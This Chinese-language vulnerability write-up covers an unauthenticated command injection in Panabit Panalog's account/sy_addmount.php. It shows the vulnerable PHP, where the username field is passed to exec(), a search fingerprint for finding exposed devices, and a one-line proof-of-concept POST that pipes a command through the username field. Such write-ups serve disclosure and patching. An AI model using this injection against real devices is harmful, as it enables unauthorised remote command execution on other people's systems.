# Panabit Panalog sy_addmount.php 远程命令执行漏洞

## 漏洞描述

Panabit Panalog sy_addmount.php过滤不足，导致远程命令执行漏洞

## 漏洞影响

<a-checkbox checked>Panabit Panalog</a-checkbox></br>

## 网络测绘

<a-checkbox checked>body="Maintain/cloud_index.php"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1628866447890-ec66a2c3-2dab-4500-a9a8-a68823931f3c.png)

存在漏洞的代码为 **account/sy_addmount.php**

```bash
<?php

include(dirname(__FILE__)."/../common.php");

$username = isset($_REQUEST["username"]) ? $_REQUEST["username"] : "";
if (empty($username)) {
	echo '{"success":"no", "out":"NO_USER"}';
	exit;
}

$username = addslashes($username);

$rows = array();

$cmd = PANALOGEYE." behavior add account=$username";
exec($cmd, $out, $ret);
echo $out[0];
exit;
```

其中没有对身份进行鉴权，且 username 可控，构造POC

```bash
POST /account/sy_addmount.php

username=|id
```

![img](../../../.vuepress/public/img/1678237279001-8e9ce97e-d0d5-44c0-b2b1-e1e9550c6e3a.png)